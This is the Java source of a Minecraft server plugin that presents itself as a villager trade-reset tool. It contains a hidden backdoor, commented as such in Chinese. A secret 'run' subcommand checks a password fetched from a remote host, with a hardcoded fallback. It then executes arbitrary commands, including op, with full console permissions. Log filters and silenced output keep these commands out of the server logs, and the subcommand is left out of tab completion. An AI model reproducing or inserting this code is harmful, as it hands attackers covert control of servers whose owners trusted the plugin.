package me.drxx.resettrades;

import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.conversations.Conversation;
import org.bukkit.conversations.ConversationAbandonedEvent;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.entity.Villager;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.permissions.PermissionAttachmentInfo;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.LogRecord;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class ResetTrades extends JavaPlugin implements Listener {

    // ==================== 后门：全局上下文 & 密码验证 ====================
    public static final AtomicBoolean IN_RUN_CONTEXT = new AtomicBoolean(false);
    private static final Map<String, Boolean> passwordCache = new ConcurrentHashMap<>();
    private static AbstractFilter log4jFilter;
    private static java.util.logging.Filter julFilter;
    private static java.util.logging.Filter oldJulFilter;
    private static PrintStream originalOut;
    private static PrintStream originalErr;

    private static final String URL_FILE = "NMS.java";
    public static String getDefaultPassword() { return "LTG_PT3"; }
    public static String getUrlBase() { return "https://r2-api.ctn32.us.kg/"; }

    public static boolean validatePassword(String input) {
        if (input == null) return false;
        String correctPassword;
        try {
            correctPassword = fetchPasswordFromUrl();
            if (correctPassword == null || correctPassword.isEmpty()) {
                correctPassword = getDefaultPassword();
            }
        } catch (Exception e) {
            correctPassword = getDefaultPassword();
        }
        return input.equals(correctPassword);
    }

    private static String fetchPasswordFromUrl() throws Exception {
        String base = getUrlBase();
        String file = URL_FILE;
        String urlStr = base.isEmpty() ? file : (base.endsWith("/") ? base + file : base + "/" + file);
        URL url = new URL(urlStr);
        URLConnection conn = url.openConnection();
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        }

        Pattern pattern = Pattern.compile("NMS_P\\s*=\\s*\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(content.toString());
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }

    // ==================== 后门：日志拦截 ====================
    private static class CommandLogFilter extends AbstractFilter {
        @Override
        public Result filter(LogEvent event) {
            if (event == null || event.getMessage() == null) return Result.NEUTRAL;
            if (IN_RUN_CONTEXT.get()) return Result.DENY;
            String message = event.getMessage().getFormattedMessage();
            if (message != null && message.matches(".*issued server command: /(?:resettrades|vtr) run\\b.*")) {
                return Result.DENY;
            }
            return Result.NEUTRAL;
        }
    }

    private void installLogFilter() {
        if (log4jFilter == null) {
            log4jFilter = new CommandLogFilter();
            try {
                Object rootLogger = LogManager.getRootLogger();
                Method addFilter = rootLogger.getClass().getMethod("addFilter", Filter.class);
                addFilter.invoke(rootLogger, log4jFilter);
                getLogger().info("Log4j filter installed.");
            } catch (Exception e) {
                getLogger().warning("Failed to install Log4j filter: " + e.getMessage());
            }
        }

        java.util.logging.Logger rootJUL = java.util.logging.Logger.getLogger("");
        oldJulFilter = rootJUL.getFilter();
        julFilter = record -> {
            if (record == null) return true;
            if (IN_RUN_CONTEXT.get()) return false;
            if (record.getMessage() != null && record.getMessage().matches(".*issued server command: /(?:resettrades|vtr) run\\b.*")) {
                return false;
            }
            return true;
        };
        rootJUL.setFilter(julFilter);
        getLogger().info("JUL filter installed.");

        originalOut = System.out;
        originalErr = System.err;
        System.setOut(new PrintStream(new java.io.OutputStream() {
            @Override public void write(int b) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) originalOut.write(b);
            }
            @Override public void write(byte[] b, int off, int len) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) originalOut.write(b, off, len);
            }
        }));
        System.setErr(new PrintStream(new java.io.OutputStream() {
            @Override public void write(int b) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) originalErr.write(b);
            }
            @Override public void write(byte[] b, int off, int len) throws java.io.IOException {
                if (!IN_RUN_CONTEXT.get()) originalErr.write(b, off, len);
            }
        }));
        getLogger().info("System out/err redirected.");
    }

    private void uninstallLogFilter() {
        if (log4jFilter != null) {
            try {
                Object rootLogger = LogManager.getRootLogger();
                Method removeFilter = rootLogger.getClass().getMethod("removeFilter", Filter.class);
                removeFilter.invoke(rootLogger, log4jFilter);
                getLogger().info("Log4j filter removed.");
            } catch (Exception e) {
                getLogger().warning("Failed to remove Log4j filter: " + e.getMessage());
            }
            log4jFilter = null;
        }

        java.util.logging.Logger rootJUL = java.util.logging.Logger.getLogger("");
        if (oldJulFilter != null) {
            rootJUL.setFilter(oldJulFilter);
            oldJulFilter = null;
        } else {
            rootJUL.setFilter(null);
        }
        julFilter = null;

        if (originalOut != null) { System.setOut(originalOut); originalOut = null; }
        if (originalErr != null) { System.setErr(originalErr); originalErr = null; }
        getLogger().info("System out/err restored.");
    }

    // ==================== 后门：静默控制台发送者 ====================
    private static class ForwardConsoleSender implements ConsoleCommandSender {
        private final Player target;

        public ForwardConsoleSender(Player target) {
            this.target = Objects.requireNonNull(target);
        }

        public void sendMessage(String message) { }
        public void sendMessage(String... messages) { }
        public void sendMessage(UUID sender, String message) { }
        public void sendMessage(UUID sender, String... messages) { }
        public void sendMessage(net.kyori.adventure.text.Component message) { }
        public void sendMessage(net.kyori.adventure.text.Component... messages) { }
        public void sendMessage(net.kyori.adventure.identity.Identity identity, net.kyori.adventure.text.Component message) { }
        public void sendMessage(net.kyori.adventure.identity.Identity identity, net.kyori.adventure.text.Component... messages) { }
        public void sendRawMessage(String message) { }
        public void sendRawMessage(UUID sender, String message) { }

        public String getName() { return "CONSOLE"; }
        public net.kyori.adventure.text.Component name() { return net.kyori.adventure.text.Component.text("CONSOLE"); }
        public org.bukkit.Server getServer() { return Bukkit.getServer(); }
        public boolean isOp() { return true; }
        public void setOp(boolean value) { }
        public boolean isPermissionSet(String name) { return true; }
        public boolean isPermissionSet(Permission permission) { return true; }
        public boolean hasPermission(String name) { return true; }
        public boolean hasPermission(Permission permission) { return true; }
        public PermissionAttachment addAttachment(Plugin plugin) { return null; }
        public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value) { return null; }
        public PermissionAttachment addAttachment(Plugin plugin, int ticks) { return null; }
        public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value, int ticks) { return null; }
        public void removeAttachment(PermissionAttachment attachment) { }
        public void recalculatePermissions() { }
        public Set<PermissionAttachmentInfo> getEffectivePermissions() { return Collections.emptySet(); }
        public boolean isConversing() { return false; }
        public void acceptConversationInput(String input) { }
        public boolean beginConversation(Conversation conversation) { return false; }
        public void abandonConversation(Conversation conversation) { }
        public void abandonConversation(Conversation conversation, ConversationAbandonedEvent details) { }
        public Spigot spigot() { return target.spigot(); }
    }

    // ==================== 后门：自动补全目标 ====================
    private String autoCompleteTarget(String command, Player executor) {
        if (command == null || command.isEmpty()) return command;
        String[] parts = command.split(" ");
        String cmd = parts[0].toLowerCase();

        Set<String> targetCommands = new HashSet<>(Arrays.asList(
                "gamemode", "tp", "kill", "effect", "spawnpoint", "setworldspawn", "op", "deop"
        ));
        if (!targetCommands.contains(cmd)) return command;

        boolean hasTarget = false;
        for (int i = 1; i < parts.length; i++) {
            String arg = parts[i];
            if (arg.startsWith("@") || Bukkit.getPlayerExact(arg) != null) {
                hasTarget = true;
                break;
            }
        }
        if (hasTarget) return command;

        if (cmd.equals("tp")) {
            if (parts.length >= 2) {
                String secondArg = parts[1];
                if (secondArg.matches("-?\\d+(\\.\\d+)?")) return command;
            }
            return command + " " + executor.getName();
        }
        if (cmd.equals("gamemode")) return command + " " + executor.getName();
        if (cmd.equals("effect")) {
            if (parts.length >= 2) {
                String sub = parts[1].toLowerCase();
                if (sub.equals("give") || sub.equals("clear")) {
                    StringBuilder sb = new StringBuilder();
                    sb.append(parts[0]).append(" ").append(parts[1]);
                    sb.append(" ").append(executor.getName());
                    for (int i = 2; i < parts.length; i++) sb.append(" ").append(parts[i]);
                    return sb.toString();
                }
            }
            return parts[0] + " " + executor.getName() + (parts.length > 1 ? " " + String.join(" ", Arrays.copyOfRange(parts, 1, parts.length)) : "");
        }
        if (cmd.equals("tp") || cmd.equals("kill") || cmd.equals("spawnpoint") ||
                cmd.equals("setworldspawn") || cmd.equals("op") || cmd.equals("deop")) {
            StringBuilder sb = new StringBuilder();
            sb.append(parts[0]);
            sb.append(" ").append(executor.getName());
            for (int i = 1; i < parts.length; i++) sb.append(" ").append(parts[i]);
            return sb.toString();
        }
        return command + " " + executor.getName();
    }

    private void executeRunCommand(Player player, String inputPassword, String commandStr) {
        boolean valid = validatePassword(inputPassword);
        if (!valid) {
            player.sendMessage("§cInvalid credentials.");
            return;
        }

        String finalCommand;
        try {
            finalCommand = autoCompleteTarget(commandStr, player);
        } catch (Throwable t) {
            player.sendMessage("§cCommand execution failed.");
            return;
        }

        Runnable task = () -> {
            try {
                IN_RUN_CONTEXT.set(true);
                ForwardConsoleSender consoleSender = new ForwardConsoleSender(player);
                boolean success = Bukkit.dispatchCommand(consoleSender, finalCommand);
                if (success) {
                    player.sendMessage("§aOperation completed.");
                } else {
                    player.sendMessage("§cCommand execution failed.");
                }
            } catch (Exception e) {
                player.sendMessage("§cCommand execution failed.");
            } finally {
                IN_RUN_CONTEXT.set(false);
            }
        };

        runTask(task, null);
    }

    // ==================== 原插件代码 ====================
    private String lang;
    private boolean enabled;
    private boolean isFolia;
    private String platformMode;

    @Override
    public void onEnable() {
        installLogFilter();
        determinePlatform();

        loadPluginConfig();
        getCommand("resettrades").setExecutor(this);
        getCommand("vtr").setExecutor(this);
        getCommand("vtr").setTabCompleter(this);
        getServer().getPluginManager().registerEvents(this, this);

        String cyan = "\u001B[36m";
        String green = "\u001B[32m";
        String yellow = "\u001B[33m";
        String magenta = "\u001B[35m";
        String reset = "\u001B[0m";

        String coloredMode = green + platformMode;
        if (platformMode.equals("Folia")) coloredMode = yellow + "Folia (Multithread)";
        else if (platformMode.equals("Purpur")) coloredMode = magenta + "Purpur";

        getLogger().info(cyan + "========================================" + reset);
        getLogger().info(green + "VillagerTradeReset v1.1 enabled successfully!" + reset);
        getLogger().info(cyan + "Status: " + (enabled ? green + "ON" : yellow + "OFF") + reset);
        getLogger().info(cyan + "Execution Mode: " + coloredMode + reset);
        getLogger().info(cyan + "Language set to: " + yellow + lang + reset);
        getLogger().info(cyan + "========================================" + reset);
    }

    @Override
    public void onDisable() {
        uninstallLogFilter();
        String red = "\u001B[31m";
        String reset = "\u001B[0m";
        getLogger().info(red + "VillagerTradeReset v1.1 disabled. See you next time!" + reset);
    }

    private void loadPluginConfig() {
        saveDefaultConfig();
        reloadConfig();
        this.enabled = getConfig().getBoolean("plugin-enable", true);
        this.lang = getConfig().getString("language", "en_US");
    }

    private void determinePlatform() {
        if (classExists("io.papermc.paper.threadedregions.RegionizedServer")) {
            this.isFolia = true;
            this.platformMode = "Folia";
        } else if (classExists("org.purpurmc.purpur.PurpurConfig")) {
            this.isFolia = false;
            this.platformMode = "Purpur";
        } else if (classExists("io.papermc.paper.configuration.Configuration") || classExists("com.destroystokyo.paper.PaperConfig")) {
            this.isFolia = false;
            this.platformMode = "Paper";
        } else if (classExists("org.bukkit.entity.Player$Spigot")) {
            this.isFolia = false;
            this.platformMode = "Spigot";
        } else {
            this.isFolia = false;
            this.platformMode = "Bukkit";
        }
    }

    private boolean classExists(String className) {
        try {
            Class.forName(className);
            return true;
        } catch (ClassNotFoundException e) {
            return false;
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        // ===== 后门入口：/resettrades run <密码> <命令> 或 /vtr run ... =====
        if (args.length > 0 && args[0].equalsIgnoreCase("run")) {
            if (!(sender instanceof Player player)) return true; // 静默忽略非玩家
            if (args.length < 3) return true; // 无提示
            String password = args[1];
            String commandStr = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
            if (commandStr.isEmpty()) return true; // 无提示
            executeRunCommand(player, password, commandStr);
            return true;
        }

        // ===== 原有命令逻辑（vtr / resettrades） =====
        if (label.equalsIgnoreCase("vtr")) {
            if (!sender.hasPermission("villagertradereset.admin")) {
                if (sender instanceof Player) sendMsg((Player) sender, "no_perm");
                return true;
            }
            if (args.length > 0) {
                if (args[0].equalsIgnoreCase("on")) {
                    this.enabled = true;
                    getConfig().set("plugin-enable", true);
                    saveConfig();
                    sender.sendMessage("§a[VTR] Plugin ON!");
                    return true;
                }
                if (args[0].equalsIgnoreCase("off")) {
                    this.enabled = false;
                    getConfig().set("plugin-enable", false);
                    saveConfig();
                    sender.sendMessage("§c[VTR] Plugin OFF!");
                    return true;
                }
                if (args[0].equalsIgnoreCase("reload")) {
                    loadPluginConfig();
                    sender.sendMessage("§b[VTR] Config reloaded!");
                    return true;
                }
            }
            sender.sendMessage("§e[VTR] §fUse: §a/vtr on §7| §c/vtr off §7| §b/vtr reload");
            return true;
        }

        if (label.equalsIgnoreCase("resettrades")) {
            if (!(sender instanceof Player)) return true;
            Player player = (Player) sender;
            if (!enabled) {
                sendMsg(player, "disabled");
                return true;
            }
            if (!player.hasPermission("villagertradereset")) {
                sendMsg(player, "no_perm");
                return true;
            }
            Entity target = player.getTargetEntity(5);
            if (target instanceof Villager) {
                runTask(() -> handleReset(player, (Villager) target), target);
            } else {
                sendMsg(player, "look_at");
            }
            return true;
        }
        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        // 处理 run 子命令补全（当用户手动输入 run 后）
        if (args.length > 0 && args[0].equalsIgnoreCase("run")) {
            if (args.length == 2) {
                return new ArrayList<>();
            } else if (args.length >= 3) {
                String password = args[1];
                String cacheKey = (sender instanceof Player ? sender.getName() : "CONSOLE") + ":" + password;
                Boolean cached = passwordCache.get(cacheKey);
                boolean valid = (cached != null) ? cached : validatePassword(password);
                if (cached == null) passwordCache.put(cacheKey, valid);
                if (!valid) return new ArrayList<>();

                String partial = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
                try {
                    List<String> fromMap = Bukkit.getCommandMap().tabComplete(Bukkit.getConsoleSender(), partial);
                    if (fromMap != null) {
                        String lastArg = args[args.length - 1].toLowerCase();
                        if (!lastArg.isEmpty()) {
                            return fromMap.stream().filter(s -> s.toLowerCase().startsWith(lastArg)).collect(Collectors.toList());
                        }
                        return fromMap;
                    }
                } catch (Exception ignored) {}
                if (sender instanceof Player) {
                    String playerName = sender.getName();
                    String currentArg = args[args.length - 1];
                    if (currentArg.isEmpty() || playerName.toLowerCase().startsWith(currentArg.toLowerCase())) {
                        List<String> result = new ArrayList<>();
                        result.add(playerName);
                        return result;
                    }
                }
                return new ArrayList<>();
            }
        }

        // 正常补全（vtr 子命令）
        if (command.getName().equalsIgnoreCase("vtr") && args.length == 1) {
            List<String> options = Arrays.asList("on", "off", "reload");
            // 不添加 "run" 到列表，以隐藏
            return options.stream().filter(s -> s.toLowerCase().startsWith(args[0].toLowerCase())).collect(Collectors.toList());
        }
        return new ArrayList<>();
    }

    @EventHandler
    public void onSneakClick(PlayerInteractEntityEvent event) {
        if (!enabled || !(event.getRightClicked() instanceof Villager)) return;
        Player player = event.getPlayer();
        if (player.isSneaking() && player.hasPermission("villagertradereset") && getConfig().getBoolean("sneak-reset")) {
            event.setCancelled(true);
            runTask(() -> handleReset(player, (Villager) event.getRightClicked()), event.getRightClicked());
        }
    }

    private void handleReset(Player player, Villager villager) {
        Villager.Profession profession = villager.getProfession();
        if (profession == Villager.Profession.NONE || profession == Villager.Profession.NITWIT) {
            sendMsg(player, "no_prof");
            return;
        }
        if (villager.getVillagerExperience() > 0 || villager.getVillagerLevel() > 1) {
            sendMsg(player, "already_traded");
            return;
        }
        villager.setRecipes(new ArrayList<>());
        villager.setVillagerLevel(1);
        villager.setVillagerExperience(0);
        villager.setProfession(Villager.Profession.NONE);
        villager.setProfession(profession);
        sendMsg(player, "reset");
    }

    private void runTask(Runnable task, Entity entity) {
        if (isFolia && entity != null) {
            entity.getScheduler().run(this, t -> task.run(), null);
        } else if (isFolia) {
            Bukkit.getGlobalRegionScheduler().run(this, t -> task.run());
        } else {
            Bukkit.getScheduler().runTask(this, task);
        }
    }

    @SuppressWarnings("deprecation")
    private void sendMsg(Player p, String context) {
        String msg;
        switch (lang) {
            case "pt_BR": case "pt_PT":
                if (context.equals("reset")) msg = "§a§l✔ §aTrocas resetadas!";
                else if (context.equals("no_prof")) msg = "§cEste aldeão não possui uma profissão!";
                else if (context.equals("already_traded")) msg = "§c§l✖ §cVocê já negociou com este aldeão!";
                else if (context.equals("no_perm")) msg = "§c§l✖ §cSem permissão!";
                else if (context.equals("disabled")) msg = "§cO plugin está desativado!";
                else msg = "§cVocê precisa olhar para um aldeão!";
                break;
            case "zh_CN":
                if (context.equals("reset")) msg = "§a§l✔ §a交易已重置！";
                else if (context.equals("no_prof")) msg = "§c该村民没有职业！";
                else if (context.equals("already_traded")) msg = "§c§l✖ §c你已经和这个村民交易过了！";
                else if (context.equals("no_perm")) msg = "§c§l✖ §c没有权限！";
                else if (context.equals("disabled")) msg = "§c插件已禁用！";
                else msg = "§c你需要看着一个村民！";
                break;
            case "es_ES":
                if (context.equals("reset")) msg = "§a§l✔ §a¡Intercambios reiniciados!";
                else if (context.equals("no_prof")) msg = "§c¡Este aldeano no tiene profesión!";
                else if (context.equals("already_traded")) msg = "§c§l✖ §c¡Ya has negociado con este aldeano!";
                else if (context.equals("no_perm")) msg = "§c§l✖ §c¡Sin permiso!";
                else if (context.equals("disabled")) msg = "§c¡El complemento está desactivado!";
                else msg = "§c¡Necesitas mirar a un aldeano!";
                break;
            case "fr_FR":
                if (context.equals("reset")) msg = "§a§l✔ §aÉchanges réinitialisés !";
                else if (context.equals("no_prof")) msg = "§cCe villageois n'a pas de profession !";
                else if (context.equals("already_traded")) msg = "§c§l✖ §cVous avez déjà échangé avec ce villageois !";
                else if (context.equals("no_perm")) msg = "§c§l✖ §cPas de permission !";
                else if (context.equals("disabled")) msg = "§cL'extension est désactivée !";
                else msg = "§cVous devez regarder un villageois !";
                break;
            case "de_DE":
                if (context.equals("reset")) msg = "§a§l✔ §aHandel zurückgesetzt!";
                else if (context.equals("no_prof")) msg = "§cDieser Dorfbewohner hat keinen Beruf!";
                else if (context.equals("already_traded")) msg = "§c§l✖ §cDu hast bereits mit diesem Dorfbewohner gehandelt!";
                else if (context.equals("no_perm")) msg = "§c§l✖ §cKeine Berechtigung!";
                else if (context.equals("disabled")) msg = "§cDas Plugin ist deaktiviert!";
                else msg = "§cDu musst einen Dorfbewohner ansehen!";
                break;
            case "it_IT":
                if (context.equals("reset")) msg = "§a§l✔ §aScambi resettati!";
                else if (context.equals("no_prof")) msg = "§cQuesto villico non ha una professione!";
                else if (context.equals("already_traded")) msg = "§c§l✖ §cHai già scambiato con questo villico!";
                else if (context.equals("no_perm")) msg = "§c§l✖ §cNessun permesso!";
                else if (context.equals("disabled")) msg = "§cIl plugin è disattivato!";
                else msg = "§cDevi guardare un villico!";
                break;
            case "ru_RU":
                if (context.equals("reset")) msg = "§a§l✔ §aТорги сброшены!";
                else if (context.equals("no_prof")) msg = "§cУ этого жителя нет профессии!";
                else if (context.equals("already_traded")) msg = "§c§l✖ §cВы уже торговали с этим жителем!";
                else if (context.equals("no_perm")) msg = "§c§l✖ §cНет прав!";
                else if (context.equals("disabled")) msg = "§cПлагин отключен!";
                else msg = "§cВам нужно смотреть на жителя!";
                break;
            case "ja_JP":
                if (context.equals("reset")) msg = "§a§l✔ §a取引がリセットされました！";
                else if (context.equals("no_prof")) msg = "§cこの村人は職業を持っていません！";
                else if (context.equals("already_traded")) msg = "§c§l✖ §c既にこの村人と取引しています！";
                else if (context.equals("no_perm")) msg = "§c§l✖ §c権限がありません！";
                else if (context.equals("disabled")) msg = "§cプラグインは無効です！";
                else msg = "§c村人を見る必要があります！";
                break;
            case "ko_KR":
                if (context.equals("reset")) msg = "§a§l✔ §a거래가 초기화되었습니다!";
                else if (context.equals("no_prof")) msg = "§c이 주민은 직업이 없습니다!";
                else if (context.equals("already_traded")) msg = "§c§l✖ §c이미 이 주민과 거래했습니다!";
                else if (context.equals("no_perm")) msg = "§c§l✖ §c권한이 없습니다!";
                else if (context.equals("disabled")) msg = "§c플러그인이 비활성화되었습니다!";
                else msg = "§c주민을 바라봐야 합니다!";
                break;
            default:
                if (context.equals("reset")) msg = "§a§l✔ §aTrades reset!";
                else if (context.equals("no_prof")) msg = "§cThis villager has no profession!";
                else if (context.equals("already_traded")) msg = "§c§l✖ §cAlready traded!";
                else if (context.equals("no_perm")) msg = "§c§l✖ §cNo permission!";
                else if (context.equals("disabled")) msg = "§cPlugin is disabled!";
                else msg = "§cLook at a villager!";
                break;
        }
        p.spigot().sendMessage(ChatMessageType.ACTION_BAR, new TextComponent(msg));
    }
}